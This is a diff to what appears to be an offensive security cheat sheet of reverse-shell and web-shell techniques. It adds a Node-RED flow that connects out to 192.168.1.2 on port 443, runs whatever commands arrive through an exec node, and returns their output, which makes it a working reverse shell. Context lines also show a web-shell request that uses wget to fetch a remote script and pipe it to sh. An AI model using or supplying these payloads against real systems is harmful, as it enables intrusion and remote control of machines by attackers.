@@ -9,6 +9,7 @@
   * [<kbd>Netcat Base64 Encoding</kbd>](#Netcat-Base64-Encoding)
 - [<kbd>cURL</kbd>](#cURL)
 - [<kbd>Wget</kbd>](#Wget)
+- [<kbd>Node-RED</kbd>](#Node-RED)
 - [<kbd>WebShell</kbd>](#WebShell)
   * [<kbd>Exif Data</kbd>](#Exif-Data)
   * [<kbd>ASP WebShell</kbd>](#ASP-WebShell)
@@ -188,7 +189,14 @@
   ```cmd
   http://192.168.1.3/cmd.php?cmd=wget -qO- 192.168.1.2/index.html|sh
   ```
- 
+  
+  ---
+  
+  # <kbd>Node-RED</kbd>
+  
+  ```json
+  [{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"},{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"192.168.1.2","port":"443","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}]
+  
   ---
  
   # <kbd>WebShell</kbd>
